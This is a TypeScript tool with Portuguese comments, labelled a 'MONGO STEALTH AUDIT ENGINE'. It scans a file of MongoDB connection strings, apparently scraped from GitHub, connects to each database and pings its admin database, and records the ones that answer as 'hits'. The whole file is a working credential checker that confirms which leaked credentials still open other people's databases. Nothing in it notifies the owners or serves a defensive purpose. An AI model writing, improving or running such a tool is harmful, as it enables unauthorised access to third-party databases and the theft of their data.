import fs from "fs/promises";
import fsSync from "fs";
import chalk from "chalk";
import { MongoClient } from "mongodb";

// --- CLASSE DO MOTOR ---
export class CredentialEngine {
  private cache: Set<string> = new Set();

  constructor(
    private filePath: string,
    private patterns: RegExp[],
    private validate: (uri: string) => Promise<boolean>,
    private outputFilePath: string = "hits_found.txt",
  ) {
    if (fsSync.existsSync(this.outputFilePath)) {
      const existing = fsSync.readFileSync(this.outputFilePath, "utf-8");
      existing.split("\n").forEach((line) => {
        if (line.trim()) this.cache.add(line.trim().toLowerCase());
      });
    }
  }

  private extractFromBlock(block: string): string[] | null {
    const allMatches: string[] = [];
    for (const pattern of this.patterns) {
      pattern.lastIndex = 0; // Reset para regex globais
      let match;
      while ((match = pattern.exec(block)) !== null) {
        allMatches.push(match[0].trim());
      }
    }
    return allMatches.length > 0 ? allMatches : null;
  }

  private async saveHit(entry: string): Promise<void> {
    if (!this.cache.has(entry.toLowerCase())) {
      await fs.appendFile(this.outputFilePath, entry + "\n");
      this.cache.add(entry.toLowerCase());
    }
  }

  async run(): Promise<void> {
    if (!fsSync.existsSync(this.filePath)) {
      console.log(chalk.red(`[-] Arquivo não encontrado: ${this.filePath}`));
      return;
    }

    try {
      const rawData = await fs.readFile(this.filePath, "utf-8");
      const blocks = rawData.split("-".repeat(60));

      for (const block of blocks) {
        if (!block.trim()) continue;

        const uris = this.extractFromBlock(block);
        if (uris) {
          for (const uri of uris) {
            const id = uri.toLowerCase();
            if (this.cache.has(id)) continue;

            const isHit = await this.validate(uri);
            if (isHit) {
              await this.saveHit(uri);
            } else {
              this.cache.add(id);
            }
          }
        }
      }
    } catch (error: any) {
      console.log(chalk.red(`\n[!] Erro no motor: ${error.message}`));
    }
  }
}

// --- LOGICA DE DASHBOARD E VALIDAÇÃO ---

let stats = { valid: 0, invalid: 0, total: 0, currentTarget: "" };

function updateDashboard() {
  // \r volta o cursor, \x1b[K limpa a linha atual
  process.stdout.write(
    `\r\x1b[K${chalk.bold(
      `[ ${chalk.green(`${stats.valid} Válidos`)} | ${chalk.red(`${stats.invalid} Inválidos`)} | Total: ${stats.total} ]`,
    )} ${chalk.yellow(`→ Testing: ${stats.currentTarget.substring(0, 60)}`)}`,
  );
}

async function validateMongoConnection(uri: string): Promise<boolean> {
  // Limpeza rápida para o teste
  const cleanUri = uri.replace(/[…\s]/g, "").split(/["'`]/)[0].trim();

  stats.currentTarget = cleanUri;
  stats.total++;
  updateDashboard();

  // Ignora se for lixo óbvio ou placeholder
  if (!cleanUri.includes("@") || cleanUri.includes("${")) {
    stats.invalid++;
    return false;
  }

  try {
    const client = new MongoClient(cleanUri, {
      connectTimeoutMS: 2000,
      serverSelectionTimeoutMS: 2000,
      family: 4,
    });

    await client.connect();
    await client.db("admin").command({ ping: 1 });
    await client.close();

    stats.valid++;
    return true;
  } catch {
    stats.invalid++;
    return false;
  }
}

// --- EXECUÇÃO ---

(async function () {
  console.clear();
  console.log(chalk.cyan.bold("=== MONGO STEALTH AUDIT ENGINE ===\n"));

  // Regex robusto para capturar tudo até delimitadores de código
  const patterns = [/mongodb(?:\+srv)?:\/\/[^\s"'`]+(?=[^"'`]*)/gi];

  const engine = new CredentialEngine(
    "D:\\programming\\novo\\filmes-online\\maongosGitsGetteds.txt",
    patterns,
    validateMongoConnection,
    "mongodb_hits_success.txt",
  );

  await engine.run();

  process.stdout.write("\r\x1b[K"); // Limpa a linha do dashboard ao terminar
  console.log(
    chalk.green.bold(
      `\n✔ Varredura finalizada! Encontrados ${stats.valid} válidos.`,
    ),
  );
})();
